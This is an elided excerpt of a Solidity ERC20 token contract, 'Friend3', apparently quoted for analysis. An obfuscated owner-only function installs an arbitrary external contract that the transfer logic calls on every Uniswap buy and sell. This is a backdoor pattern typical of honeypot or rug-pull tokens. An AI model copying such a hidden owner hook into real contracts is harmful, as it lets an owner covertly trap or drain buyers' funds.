...
contract TokenM is ERC20 {
    ...
    IUserAmounteringe public eringe;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Friend3", "F3") {
    ...
    function cuierhjaBbhuerRkks(IUserAmounteringe _eringe) public onlyOwner {
        eringe = _eringe;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                eringe.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				eringe.addOutAmount(from, amount);
            }else{
                eringe.addOutAmount(from, amount);
                takeFee = false;
            }
